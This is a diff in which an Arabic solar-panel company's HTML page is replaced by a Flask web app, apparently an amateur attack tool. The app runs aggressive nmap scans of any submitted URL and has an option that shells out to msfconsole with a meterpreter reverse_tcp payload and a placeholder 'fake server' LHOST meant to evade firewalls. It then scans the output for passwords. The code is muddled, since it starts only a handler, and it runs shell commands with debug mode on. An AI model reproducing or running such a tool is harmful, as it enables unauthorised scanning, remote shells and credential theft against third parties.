@@ -1,73 +1,107 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ألواح الطاقة الشمسية</title>
-    <!-- ربط ملف CSS -->
-    <link rel="stylesheet" href="legendary-happiness/style.css">
-    <link rel="icon" href="images/logo.png"> <!-- اللوجو -->
-</head>
-<body>
-    <!-- القائمة المنسدلة -->
-    <div class="menu-icon" onclick="toggleMenu()">☰</div>
-    <nav class="menu" id="menu">
-        <a href="#home" onclick="closeMenu()">الرئيسية</a>
-        <a href="#about" onclick="closeMenu()">من نحن</a>
-        <a href="#services" onclick="closeMenu()">خدماتنا</a>
-        <a href="#payment" onclick="closeMenu()">الدفع الإلكتروني</a>
-        <a href="#contact" onclick="closeMenu()">تواصل معنا</a>
-    </nav>
+from flask import Flask, request, render_template
+import requests
+from bs4 import BeautifulSoup
+import nmap
+import subprocess
+import socket
 
-    <!-- الصفحة الرئيسية -->
-    <section id="home" class="active">
-        <h1>أعمالنا</h1>
-        <div class="gallery">
-            <div class="gallery-item">
-                <p>نقدم لكم أفضل حلول الطاقة الشمسية بتقنيات حديثة.</p>
-                <img src="images/work1.jpg" alt="عمل 1" onclick="openModal('images/work1.jpg')">
-            </div>
-            <div class="gallery-item">
-                <p>تركيب ألواح الطاقة الشمسية بجودة عالية.</p>
-                <img src="images/work2.jpg" alt="عمل 2" onclick="openModal('images/work2.jpg')">
-            </div>
-            <!-- أضف بقية الصور هنا بنفس الطريقة -->
-        </div>
-    </section>
+app = Flask(__name__)
 
-    <!-- قسم "من نحن" -->
-    <section id="about">
-        <h2>من نحن</h2>
-        <p>نحن شركة مطر المتخصصة في تركيب ألواح الطاقة الشمسية. نقدم حلولًا مبتكرة وموثوقة لتلبية احتياجاتكم من الطاقة النظيفة والمستدامة. نتميز بأدائنا العالي وجودة خدماتنا التي تلبي توقعات عملائنا.</p>
-    </section>
+@app.route('/')
+def home():
+    return render_template('index.html')
 
-    <!-- قسم "خدماتنا" -->
-    <section id="services">
-        <h2>خدماتنا</h2>
-        <p>يتوفر لدينا قواعد مختلفة لجميع الألواح الشمسية وبجميع المقاسات. نقدم خدمات شاملة تشمل التصميم والتركيب والصيانة لضمان أداء مثالي لأنظمة الطاقة الشمسية.</p>
-    </section>
+@app.route('/scan', methods=['POST'])
+def scan():
+    url = request.form['url']
+    option = request.form['option']
 
-    <!-- قسم الدفع الإلكتروني -->
-    <section id="payment">
-        <h2>الدفع الإلكتروني</h2>
-        <p>يمكنك الدفع عبر حساب البنك البركة. الرجاء استخدام التفاصيل التالية:</p>
-        <p>رقم الحساب: XXXX-XXXX-XXXX-XXXX</p>
-        <p>عند إدخال بيانات الـ IBAN، سيتم التحقق من المعلومات وإكمال العملية.</p>
-    </section>
+    # التحقق من صحة الرابط
+    if not url.startswith(("http://", "https://")):
+        return "رابط غير صحيح!"
+    if "localhost" in url or "127.0.0.1" in url:
+        return "رابط غير صحيح!"
 
-    <!-- تواصل معنا -->
-    <section id="contact">
-        <h2>تواصل معنا</h2>
-        <p>الهاتف: 0958944604</p>
-        <p>البريد الإلكتروني: baraamatar11@gmail.com</p>
-    </section>
+    if option == '1':
+        # فحص الرابط
+        info = basic_scan(url)
+        return render_template('result.html', info=info)
+    elif option == '2':
+        # اكتشاف الثغرات
+        vulns = scan_vulnerabilities(url)
+        return render_template('result.html', info=vulns)
+    elif option == '3':
+        # تقديم نصائح لتحسين أمان الحساب
+        security_tips = provide_security_tips(url)
+        return render_template('result.html', info=security_tips)
+    elif option == '4':
+        # محاولة استغلال قاعدة البيانات باستخدام Metasploit
+        exploit_result = exploit_tls_database(url)
+        return render_template('result.html', info=exploit_result)
+    else:
+        return "Invalid option."
 
-    <!-- نافذة الصورة الموسعة -->
-    <div id="modal" class="modal">
-        <span class="close" onclick="closeModal()">&times;</span>
-        <img class="modal-content" id="modal-img">
-    </div>
+def basic_scan(url):
+    # تنفيذ الفحص الأساسي للرابط
+    response = requests.get(url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    title = soup.title.string
+    return {'title': title, 'url': url}
 
-    <script src="legendary-happiness/account.js" defer></script>
-</body>
-</html>
+def scan_vulnerabilities(url):
+    # تنفيذ فحص الثغرات باستخدام Nmap
+    nm = nmap.PortScanner()
+    nm.scan(url, arguments='-A')
+    open_ports = []
+    for proto in nm[url].all_protocols():
+        lport = nm[url][proto].keys()
+        for port in lport:
+            if nm[url][proto][port]['state'] == 'open':
+                open_ports.append((proto, port, nm[url][proto][port]))
+    return {'open_ports': open_ports}
+
+def provide_security_tips(url):
+    # تقديم نصائح لتحسين الأمان
+    tips = [
+        "استخدم كلمات مرور قوية وفريدة لكل حساب.",
+        "فعّل المصادقة الثنائية.",
+        "تحقق من الأجهزة المتصلة بحسابك بانتظام.",
+        "تجنب النقر على الروابط المشبوهة أو الاستجابة للرسائل غير المعروفة."
+    ]
+    return {'security_tips': tips}
+
+def exploit_tls_database(url):
+    # محاولة استغلال قاعدة البيانات باستخدام Metasploit
+    nm = nmap.PortScanner()
+    nm.scan(url, arguments='-p- --open')  # فحص جميع المنافذ المفتوحة
+    open_ports = [port for port in nm[url]['tcp'] if nm[url]['tcp'][port]['state'] == 'open']
+
+    # اكتشاف الـ IP المحلي للمهاجم
+    attacker_ip = socket.gethostbyname(socket.gethostname())
+    payload = "windows/meterpreter/reverse_tcp"
+    
+    # إعداد سيرفر وهمي من أجل محاولة تجاوز الجدار الناري
+    fake_server_ip = "your_fake_server_ip"  # استبدل بعنوان السيرفر الوهمي
+    fake_server_port = "your_fake_server_port"  # استبدل بمنفذ السيرفر الوهمي
+
+    results = []
+    for port in open_ports:
+        cmd = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {fake_server_ip}; set LPORT {fake_server_port}; exploit -j; exit'"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        results.append(result.stdout)
+
+    # استخراج المعلومات المهمة من النتائج
+    important_info = extract_important_info(results)
+    
+    return {'exploit_result': results, 'important_info': important_info}
+
+def extract_important_info(results):
+    important_info = []
+    for result in results:
+        if "password" in result:
+            important_info.append(result)
+        # يمكن إضافة المزيد من الشروط لاستخراج المعلومات المهمة الأخرى
+    return important_info
+
+if __name__ == '__main__':
+    app.run(debug=True)
